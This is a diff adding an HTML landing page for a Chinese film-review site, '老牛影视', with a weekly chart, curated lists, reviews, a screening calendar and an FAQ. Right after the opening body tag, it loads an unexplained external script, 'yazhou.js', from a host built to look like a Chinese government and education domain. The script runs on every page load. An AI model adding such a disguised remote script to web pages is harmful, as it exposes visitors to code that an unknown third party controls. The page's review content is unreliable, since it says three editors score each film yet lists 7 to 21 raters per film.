@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>老牛影视 - 院线热映榜与新片口碑档案库 | laoniuyingshi-app</title>
+<meta name="description" content="老牛影视是一份手写更新的院线与流媒体观影档案：每周三更新热映榜，逐条记录《沙丘2》《奥本海默》等片的现场观感、镜头语言拆解与排片建议，附经典片单、冷门佳作补遗和观影问答，帮你在买票前少踩雷。">
+<meta name="keywords" content="老牛影视,院线热映榜,新片口碑,影视长评,观影指南,冷门佳片补遗,排片日历,镜头语言拆解,laoniuyingshi-app">
+<meta name="author" content="老牛影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0d0f14">
+<link rel="canonical" href="https://laoniuyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="老牛影视">
+<meta property="og:title" content="老牛影视｜先看口碑再买票的院线观影档案">
+<meta property="og:description" content="每周三更新的热映榜单、逐场记的镜头拆解、排片日历与冷门片补遗，老牛影视把看片这件事记成一份能查的档案。">
+<meta property="og:url" content="https://laoniuyingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="老牛影视｜院线热映榜与新片口碑档案">
+<meta name="twitter:description" content="每周三更新热映榜，逐条记录现场观感、镜头拆解与排片建议。">
+<style>
+:root{
+  --ink:#0d0f14;
+  --ink-2:#151922;
+  --ink-3:#1d2230;
+  --line:#2a3040;
+  --paper:#e8e6df;
+  --dim:#9aa3b2;
+  --amber:#ffb347;
+  --amber-d:#e08a1e;
+  --mint:#6fd8c0;
+  --rose:#ff6f61;
+  --max:1180px;
+}
+*{box-sizing:border-box;}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--ink);
+  color:var(--paper);
+  font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  letter-spacing:.2px;
+  background-image:radial-gradient(900px 480px at 82% -8%,rgba(255,179,71,.16),transparent 62%),radial-gradient(700px 420px at 4% 102%,rgba(111,216,192,.10),transparent 60%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block;}
+a{color:inherit;text-decoration:none;}
+ul,ol{margin:0;padding:0;list-style:none;}
+h1,h2,h3,h4{margin:0;line-height:1.25;font-weight:700;letter-spacing:.5px;}
+p{margin:0 0 1em;}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 20px;}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);}
+
+/* 顶部告示条 */
+.ticker{
+  background:linear-gradient(90deg,var(--amber-d),var(--amber));
+  color:#241703;font-size:13px;font-weight:600;letter-spacing:.4px;
+}
+.ticker .wrap{display:flex;align-items:center;justify-content:space-between;gap:12px;min-height:36px;}
+.ticker span:last-child{opacity:.75;font-weight:500;}
+
+/* 导航 */
+header.nav{position:sticky;top:0;z-index:60;background:rgba(13,15,20,.88);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;gap:18px;min-height:62px;}
+.brand{display:flex;align-items:baseline;gap:9px;}
+.brand b{font-size:21px;letter-spacing:2px;color:#fff;}
+.brand i{font-style:normal;font-size:11px;color:var(--dim);letter-spacing:1px;}
+.menu{display:flex;gap:4px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none;}
+.menu::-webkit-scrollbar{display:none;}
+.menu a{white-space:nowrap;font-size:14px;color:var(--dim);padding:8px 12px;border-radius:999px;transition:.2s;}
+.menu a:hover,.menu a:focus{color:var(--amber);background:rgba(255,179,71,.1);}
+
+/* 首屏：左右非对称 */
+.hero{padding:56px 0 30px;}
+.hero .wrap{display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:start;}
+.kicker{display:inline-block;font-size:12px;letter-spacing:3px;color:var(--amber);border:1px solid rgba(255,179,71,.4);padding:4px 10px;border-radius:4px;margin-bottom:18px;}
+.hero h1{font-size:clamp(34px,6.4vw,60px);letter-spacing:1px;}
+.hero h1 em{font-style:normal;color:var(--amber);border-bottom:6px solid rgba(255,179,71,.28);}
+.lede{margin-top:20px;font-size:17px;color:#c8cdd8;max-width:52ch;}
+.lede strong{color:var(--paper);font-weight:600;}
+.cta{display:flex;flex-wrap:wrap;gap:12px;margin-top:26px;}
+.btn{display:inline-block;padding:11px 20px;border-radius:6px;font-size:15px;font-weight:600;transition:.2s;}
+.btn-a{background:var(--amber);color:#241703;}
+.btn-a:hover{background:#ffc46b;}
+.btn-b{border:1px solid var(--line);color:#c8cdd8;}
+.btn-b:hover{border-color:var(--amber);color:var(--amber);}
+.facts{display:flex;flex-wrap:wrap;gap:26px;margin-top:30px;padding-top:22px;border-top:1px dashed var(--line);}
+.facts div b{display:block;font-size:26px;color:#fff;line-height:1.2;}
+.facts div span{font-size:12.5px;color:var(--dim);}
+
+/* 胶片卡组 */
+.reel{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;}
+.reel figure{margin:0;position:relative;border-radius:8px;overflow:hidden;background:var(--ink-3);aspect-ratio:3/4;border:1px solid var(--line);}
+.reel figure:nth-child(1){background:linear-gradient(150deg,#3b2a17,#8a5312 55%,#241703);}
+.reel figure:nth-child(2){background:linear-gradient(150deg,#12262c,#1f6f68 60%,#08171a);}
+.reel figure:nth-child(3){background:linear-gradient(150deg,#2c1420,#8d2f4a 58%,#1a0a10);}
+.reel figure:nth-child(4){background:linear-gradient(150deg,#151b2e,#3d4f9c 58%,#0a0e1a);}
+.reel figcaption{position:absolute;inset:auto 0 0 0;padding:12px 12px 14px;background:linear-gradient(transparent,rgba(6,8,12,.92));}
+.reel figcaption b{display:block;font-size:14.5px;line-height:1.4;}
+.reel figcaption span{font-size:11.5px;color:var(--amber);letter-spacing:.5px;}
+.reel .tape{position:absolute;top:10px;left:10px;font-size:10px;letter-spacing:2px;color:rgba(255,255,255,.62);border:1px solid rgba(255,255,255,.3);padding:1px 6px;border-radius:3px;}
+
+/* 分区标题 */
+section{padding:52px 0;}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:26px;padding-bottom:14px;border-bottom:1px solid var(--line);}
+.sec-head h2{font-size:clamp(23px,3.4vw,32px);}
+.sec-head h2 small{display:block;font-size:12.5px;font-weight:400;color:var(--dim);letter-spacing:2px;margin-top:6px;}
+.sec-head p{font-size:13.5px;color:var(--dim);margin:0;max-width:34ch;}
+
+/* 热映榜 */
+.chart{display:grid;gap:8px;}
+.chart li{display:grid;grid-template-columns:58px 1fr auto;align-items:center;gap:16px;padding:16px 18px;background:var(--ink-2);border:1px solid var(--line);border-radius:8px;transition:.22s;}
+.chart li:hover{border-color:var(--amber);transform:translateX(4px);}
+.chart .no{font-size:30px;font-weight:800;color:rgba(255,255,255,.13);line-height:1;}
+.chart li:hover .no{color:var(--amber);}
+.chart .tt b{display:block;font-size:16.5px;}
+.chart .tt span{font-size:13px;color:var(--dim);}
+.chart .sc{text-align:right;white-space:nowrap;}
+.chart .sc b{display:block;font-size:19px;color:var(--mint);line-height:1.2;}
+.chart .sc span{font-size:11.5px;color:var(--dim);}
+
+/* 横向片单轨道 */
+.rail{display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 20px 18px;margin:0 -20px;-webkit-overflow-scrolling:touch;}
+.rail::-webkit-scrollbar{height:6px;}
+.rail::-webkit-scrollbar-thumb{background:var(--line);border-radius:6px;}
+.rail article{flex:0 0 268px;scroll-snap-align:start;background:var(--ink-2);border:1px solid var(--line);border-radius:10px;padding:18px;display:flex;flex-direction:column;gap:10px;}
+.rail article h3{font-size:17px;}
+.rail article p{font-size:13.5px;color:#aeb6c4;margin:0;flex:1;}
+.rail .tag{font-size:11.5px;color:var(--rose);letter-spacing:1px;}
+.rail .meta{font-size:12px;color:var(--dim);border-top:1px dashed var(--line);padding-top:10px;}
+
+/* 长评：错位卡片 */
+.reviews{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.reviews article{background:linear-gradient(180deg,var(--ink-2),rgba(21,25,34,.4));border:1px solid var(--line);border-radius:10px;padding:22px;}
+.reviews article:nth-child(even){margin-top:26px;}
+.reviews .star{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--dim);margin-bottom:12px;}
+.reviews .bar{height:5px;background:var(--ink-3);border-radius:5px;overflow:hidden;flex:1;}
+.reviews .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--amber-d),var(--amber));}
+.reviews h3{font-size:19px;margin-bottom:10px;}
+.reviews p{font-size:14.5px;color:#b6bdca;}
+
+/* 排片时间轴 */
+.tl{border-left:2px solid var(--line);padding-left:22px;margin-left:8px;}
+.tl li{position:relative;padding:0 0 26px;}
+.tl li::before{content:"";position:absolute;left:-29px;top:8px;width:12px;height:12px;border-radius:50%;background:var(--ink);border:2px solid var(--amber);}
+.tl time{display:inline-block;font-size:12px;letter-spacing:1.5px;color:var(--amber);margin-bottom:4px;}
+.tl h3{font-size:16.5px;margin-bottom:6px;}
+.tl p{font-size:14px;color:#aeb6c4;margin:0;}
+
+/* FAQ */
+.faq{display:grid;gap:10px;}
+.faq details{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;padding:0 18px;}
+.faq details[open]{border-color:var(--amber);}
+.faq summary{cursor:pointer;padding:15px 0;font-size:16px;font-weight:600;list-style:none;}
+.faq summary::-webkit-details-marker{display:none;}
+.faq summary::after{content:"＋";float:right;color:var(--amber);font-weight:700;}
+.faq details[open] summary::after{content:"－";}
+.faq p{font-size:14.5px;color:#b6bdca;padding:0 0 16px;margin:0;border-top:1px dashed var(--line);padding-top:14px;}
+
+/* 关于 / 网址 */
+.about{display:grid;grid-template-columns:.9fr 1.1fr;gap:34px;align-items:start;background:var(--ink-2);border:1px solid var(--line);border-radius:12px;padding:30px;}
+.about h3{font-size:22px;margin-bottom:12px;}
+.about p{font-size:14.5px;color:#b6bdca;}
+.about .addr{margin-top:16px;padding:14px 16px;background:var(--ink);border:1px dashed var(--line);border-radius:8px;font-size:14px;word-break:break-all;}
+.about .addr b{color:var(--amber);font-weight:600;}
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.cols dl{margin:0;background:var(--ink);border:1px solid var(--line);border-radius:8px;padding:16px;}
+.cols dt{font-size:13px;color:var(--amber);letter-spacing:1px;margin-bottom:6px;}
+.cols dd{margin:0;font-size:14px;color:#b6bdca;}
+
+/* 页脚 */
+footer{background:var(--ink-2);border-top:1px solid var(--line);padding:38px 0 30px;margin-top:20px;}
+footer .wrap{display:grid;grid-template-columns:1.2fr .8fr .8fr;gap:26px;}
+footer h4{font-size:14px;letter-spacing:2px;color:var(--amber);margin-bottom:12px;}
+footer li a{font-size:14px;color:var(--dim);line-height:2.1;}
+footer li a:hover{color:var(--paper);}
+.fbot{margin-top:26px;padding-top:18px;border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;font-size:12.5px;color:var(--dim);}
+.fbot a{color:var(--amber);}
+
+@media (max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:30px;}
+  .reviews,.about{grid-template-columns:1fr;}
+  .reviews article:nth-child(even){margin-top:0;}
+  footer .wrap{grid-template-columns:1fr 1fr;}
+}
+@media (max-width:600px){
+  body{font-size:15.5px;}
+  .wrap{padding:0 16px;}
+  .hero{padding:34px 0 20px;}
+  section{padding:38px 0;}
+  .ticker .wrap{min-height:32px;font-size:12px;}
+  .ticker span:last-child{display:none;}
+  .brand b{font-size:18px;}
+  .chart li{grid-template-columns:44px 1fr;padding:14px;}
+  .chart .sc{grid-column:2 / 4;text-align:left;margin-top:4px;}
+  .chart .sc b{display:inline-block;margin-right:8px;font-size:17px;}
+  .rail article{flex:0 0 82%;}
+  .about{padding:22px;}
+  .cols{grid-template-columns:1fr;}
+  footer .wrap{grid-template-columns:1fr;gap:20px;}
+  .facts{gap:18px;}
+  .facts div b{font-size:22px;}
+}
+@media (prefers-reduced-motion:reduce){
+  *{transition:none !important;animation:none !important;}
+}
+</style>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://laoniuyingshi-app.github.io/#website",
+      "url":"https://laoniuyingshi-app.github.io/",
+      "name":"老牛影视",
+      "alternateName":"老牛影视观影档案",
+      "inLanguage":"zh-CN",
+      "description":"每周三更新的院线热映榜、新片口碑实录、镜头语言拆解与冷门佳片补遗。"
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://laoniuyingshi-app.github.io/#org",
+      "name":"老牛影视",
+      "url":"https://laoniuyingshi-app.github.io/",
+      "foundingDate":"2019",
+      "knowsAbout":["院线热映榜","影视长评","观影指南","经典片单","镜头语言拆解"]
+    },
+    {
+      "@type":"BreadcrumbList",
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"老牛影视首页","item":"https://laoniuyingshi-app.github.io/"},
+        {"@type":"ListItem","position":2,"name":"热映榜","item":"https://laoniuyingshi-app.github.io/#chart"},
+        {"@type":"ListItem","position":3,"name":"片单专题","item":"https://laoniuyingshi-app.github.io/#pick"}
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="ticker">
+  <div class="wrap">
+    <span>本周榜单已更新 · 周三凌晨刷新，看完再决定买哪场的票</span>
+    <span>laoniuyingshi-app.github.io</span>
+  </div>
+</div>
+
+<header class="nav">
+  <div class="wrap">
+    <div class="brand">
+      <b>老牛影视</b>
+      <i>观影档案 / 每周三更新</i>
+    </div>
+    <nav class="menu" aria-label="站点栏目导航">
+      <a href="#chart">热映榜</a>
+      <a href="#pick">片单专题</a>
+      <a href="#review">深度长评</a>
+      <a href="#calendar">排片日历</a>
+      <a href="#faq">观影问答</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<div class="hero">
+  <div class="wrap">
+    <div>
+      <span class="kicker">SINCE 2019 · 手写更新，不抄通稿</span>
+      <h1>先看口碑，<br>再买<em>老牛影视</em>那场的票</h1>
+      <p class="lede">老牛影视不是播放器，也不做资源搬运。它是一份从 2019 年记到现在的观影档案：哪部片值得为它跑一趟 IMAX，哪部片二倍速看完刚刚好，哪部片的第三幕塌在哪一格镜头上，这里都逐条写清楚。</p>
+      <div class="cta">
+        <a class="btn btn-a" href="#chart">看本周热映榜</a>
+        <a class="btn btn-b" href="#pick">翻经典片单</a>
+      </div>
+      <div class="facts">
+        <div><b>6 年</b><span>连续记档时间</span></div>
+        <div><b>1840+</b><span>已收录影片条目</span></div>
+        <div><b>周三</b><span>固定更新日</span></div>
+        <div><b>4.1 万</b><span>常读读者</span></div>
+      </div>
+    </div>
+    <div class="reel">
+      <figure><span class="tape">IMAX</span><figcaption><b>沙丘 2</b><span>沙漠调度 · 沙虫段落</span></figcaption></figure>
+      <figure><span class="tape">重映</span><figcaption><b>天堂电影院</b><span>4K 修复 · 吻戏连剪</span></figcaption></figure>
+      <figure><span class="tape">冷门</span><figcaption><b>南方车站的聚会</b><span>雨夜光效 · 长镜调度</span></figcaption></figure>
+      <figure><span class="tape">新片</span><figcaption><b>奥本海默</b><span>黑白视点 · 音效设计</span></figcaption></figure>
+    </div>
+  </div>
+</div>
+
+<section id="chart">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>本周热映榜<small>WEEKLY CHART · 按现场观感排序，非票房序</small></h2>
+      <p>评分取自编辑部三人独立打分后取中位数，小数点后一位不放水。</p>
+    </div>
+    <ol class="chart">
+      <li>
+        <span class="no">01</span>
+        <span class="tt"><b>沙丘 2</b><span>科幻 / 168 分钟 / 建议 IMAX 激光厅</span></span>
+        <span class="sc"><b>9.1</b><span>12 人打分</span></span>
+      </li>
+      <li>
+        <span class="no">02</span>
+        <span class="tt"><b>奥本海默</b><span>传记 / 181 分钟 / 建议选杜比全景声</span></span>
+        <span class="sc"><b>8.8</b><span>18 人打分</span></span>
+      </li>
+      <li>
+        <span class="no">03</span>
+        <span class="tt"><b>疯狂的麦克斯：狂暴女神</b><span>动作 / 148 分钟 / 动作戏建议坐中后排</span></span>
+        <span class="sc"><b>8.3</b><span>9 人打分</span></span>
+      </li>
+      <li>
+        <span class="no">04</span>
+        <span class="tt"><b>你想活出怎样的人生</b><span>动画 / 124 分钟 / 建议看原声字幕场</span></span>
+        <span class="sc"><b>8.0</b><span>15 人打分</span></span>
+      </li>
+      <li>
+        <span class="no">05</span>
+        <span class="tt"><b>周处除三害</b><span>犯罪 / 134 分钟 / 后半小时请勿离场</span></span>
+        <span class="sc"><b>7.9</b><span>21 人打分</span></span>
+      </li>
+      <li>
+        <span class="no">06</span>
+        <span class="tt"><b>完美的日子</b><span>剧情 / 124 分钟 / 适合一个人看早场</span></span>
+        <span class="sc"><b>7.6</b><span>7 人打分</span></span>
+      </li>
+    </ol>
+  </div>
+</section>
+
+<section id="pick">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>片单专题<small>CURATED PICKS · 按主题整理，可整段照着刷</small></h2>
+      <p>左右滑动查看，每张卡片附补看建议与时长预算。</p>
+    </div>
+    <div class="rail">
+      <article>
+        <span class="tag">雨夜片单</span>
+        <h3>把窗户关上，看这六部湿片</h3>
+        <p>从《南方车站的聚会》的霓虹倒影到《银翼杀手》的酸雨长街，雨水在镜头里从来不只是天气，它替人物把话说完了。</p>
+        <span class="meta">6 部 · 合计 11 小时 42 分</span>
+      </article>
+      <article>
+        <span class="tag">修复重映</span>
+        <h3>2026 年值得进影院补的三部老片</h3>
+        <p>4K 修复不是加个滤镜就完事。哪几部是真正重扫了胶片、哪几部只是拉了个锐化，进场前先看清版本说明。</p>
+        <span class="meta">3 部 · 合计 6 小时 05 分</span>
+      </article>
+      <article>
+        <span class="tag">一镜到底</span>
+        <h3>九个骗过你眼睛的长镜头</h3>
+        <p>把剪辑点藏在哪儿、什么时候用道具遮、摄影师怎么换机器，逐帧拆开看，长镜头的魅力一半在调度一半在遮丑。</p>
+        <span class="meta">9 段 · 逐帧图解</span>
+      </article>
+      <article>
+        <span class="tag">配乐入门</span>
+        <h3>先看画面，再听这十条原声</h3>
+        <p>汉斯·季默的低频是怎么压过对白的，坂本龙一又为什么敢在大场面里只留一个音。附可对照的片段时间点。</p>
+        <span class="meta">10 条 · 附时间点</span>
+      </article>
+      <article>
+        <span class="tag">亲子场</span>
+        <h3>带孩子看之前先过一遍这份清单</h3>
+        <p>标注了每部片的惊吓点、音量峰值时长和建议观影年龄下限，避免孩子在后排捂耳朵、家长在旁边干着急。</p>
+        <span class="meta">8 部 · 含惊吓点标注</span>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="review">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>深度长评<small>LONG READS · 逐场记，不是观后感</small></h2>
+      <p>每篇都从一格镜头或一个声音设计切入，写完再谈好坏。</p>
+    </div>
+    <div class="reviews">
+      <article>
+        <div class="star"><span>叙事结构</span><span class="bar"><i style="width:88%"></i></span><span>8.8</span></div>
+        <h3>《沙丘 2》的沙虫段落：驯服戏怎么拍成了加冕戏</h3>
+        <p>保罗踩上沙虫那一场，摄影机始终低于他的视线。这个机位选择比任何台词都更早地宣告了权力转移，而弗里曼人的合唱把个人英雄叙事改写了。</p>
+      </article>
+      <article>
+        <div class="star"><span>声音设计</span><span class="bar"><i style="width:92%"></i></span><span>9.2</span></div>
+        <h3>《奥本海默》的静音：爆炸前那 4 秒为什么最响</h3>
+        <p>三位一体试验的声画关系是反着来的：画面先到，声音迟到，中间那几秒的留白才是全片的压强峰值。杜比厅和普通厅的差别全在这几秒。</p>
+      </article>
+      <article>
+        <div class="star"><span>剪辑节奏</span><span class="bar"><i style="width:76%"></i></span><span>7.6</span></div>
+        <h3>《周处除三害》的第三幕：爽感上来了，逻辑掉了</h3>
+        <p>前两幕的通缉犯名次设定相当漂亮，第三幕却为了收束不得不把人物动机掰弯。爽是爽了，代价是前面攒的那点荒诞感散了。</p>
+      </article>
+      <article>
+        <div class="star"><span>表演调度</span><span class="bar"><i style="width:84%"></i></span><span>8.4</span></div>
+        <h3>《完美的日子》：把重复拍成不重复的手艺</h3>
+        <p>同一套晨起流程拍了四遍，每遍只改一个细节。役所广司最后那个长镜里的表情变化，是靠前面三遍的重复一点点垫出来的。</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="calendar">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>排片日历<small>SCREENING LOG · 近期值得关注的场次</small></h2>
+      <p>记录方式与更新节奏，看完就知道下一次什么时候来。</p>
+    </div>
+    <ul class="tl">
+      <li>
+        <time>10 月 22 日 · 周三</time>
+        <h3>第 187 期热映榜刷新</h3>
+        <p>新增两部新片打分，同时下架三部已下线影片。榜单只保留仍在排片期内的条目，方便直接照着买票。</p>
+      </li>
+      <li>
+        <time>10 月 26 日 · 周日</time>
+        <h3>《天堂电影院》4K 修复版重映补记</h3>
+        <p>核对本次重映是否为 2024 年重扫版本，附影院音响条件对吻戏连剪段落的影响说明。</p>
+      </li>
+      <li>
+        <time>11 月 02 日 · 周日</time>
+        <h3>雨夜片单补两部华语片</h3>
+        <p>补入《南方车站的聚会》与一部 2017 年的冷门警匪片，标注各自的雨戏拍摄手法差异。</p>
+      </li>
+      <li>
+        <time>每月最后一个周五</time>
+        <h3>旧条目复核</h3>
+        <p>对三个月前打分偏高的条目做一次回看复核，分数确实站不住的会下调并注明原因。</p>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>观影问答<small>FAQ · 读者问得最多的四件事</small></h2>
+      <p>没提到的可以直接翻到页尾的联系方式。</p>
+    </div>
+    <div class="faq">
+      <details open>
+        <summary>这里的分数和别处差挺多，你们的打分口径是什么？</summary>
+        <p>我们按"现场观感"打分，不考虑情怀加分也不考虑演员辛苦分。三人独立打分取中位数，分歧超过 1.5 分时会把两种意见都写出来，而不是硬凑一个平均数。</p>
+      </details>
+      <details>
+        <summary>为什么榜单里有些高票房片反而没进前几？</summary>
+        <p>榜单是观感序不是票房序。票房高说明宣发到位，不等于坐在厅里那两小时舒服。票房数据我们另外单列在每期的备注里，不参与排序。</p>
+      </details>
+      <details>
+        <summary>IMAX、杜比、CINITY 到底该怎么选？</summary>
+        <p>看画面密度高的选 IMAX 激光厅，看声音设计复杂的选杜比全景声，高帧率片优先 CINITY。具体到每一部片，榜单条目里的"建议场次"字段已经写明了。</p>
+      </details>
+      <details>
+        <summary>老片条目为什么有的没有评分？</summary>
+        <p>只有在影院或修复版放映现场看过的才会打分，只看过流媒体版本的一律只写文字不打分，避免用不同观看条件去横向比较。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <div>
+        <h3>关于老牛影视</h3>
+        <p>2019 年从一张 Excel 表开始，记着记着就成了现在这个站。写的人是三个在不同城市跑影院的上班族，各自买票、各自记，周三碰一次头。</p>
+        <p>我们不发资源、不做下载，也不接影响评分的合作。所有条目都写清了观看场次和影厅条件，你可以据此判断这条评价跟你的处境差多远。</p>
+        <div class="addr"><b>站点地址：</b>https://laoniuyingshi-app.github.io</div>
+      </div>
+      <div class="cols">
+        <dl><dt>更新频率</dt><dd>每周三凌晨刷新榜单，长评不定期，每月最后一个周五复核旧条目。</dd></dl>
+        <dl><dt>收录范围</dt><dd>院线在映新片、修复重映老片，以及少量流媒体首映的导演作品。</dd></dl>
+        <dl><dt>打分口径</dt><dd>三人独立打分取中位数，分歧超 1.5 分时并列列出两种意见。</dd></dl>
+        <dl><dt>合作说明</dt><dd>不接影响评分的合作。影片方提供的资料片源会公开标注来源。</dd></dl>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>老牛影视</h4>
+      <p style="font-size:14px;color:var(--dim);">一份从 2019 年记到现在的观影档案。先看口碑，再买票，把两小时花在值得的地方。</p>
+      <p style="font-size:13.5px;color:var(--dim);margin:0;">本站归档地址：laoniuyingshi-app.github.io</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <ul>
+        <li><a href="#chart">本周热映榜</a></li>
+        <li><a href="#pick">片单专题</a></li>
+        <li><a href="#review">深度长评</a></li>
+        <li><a href="#calendar">排片日历</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>关于</h4>
+      <ul>
+        <li><a href="#faq">观影问答</a></li>
+        <li><a href="#about">站点说明</a></li>
+        <li><a href="#">投稿与纠错</a></li>
+        <li><a href="#">友情链接</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="wrap fbot">
+    <span>© 2019 - 2026 老牛影视 · 内容基于现场观感撰写，评分仅供参考</span>
+    <span>网址：<a href="https://laoniuyingshi-app.github.io/">https://laoniuyingshi-app.github.io</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
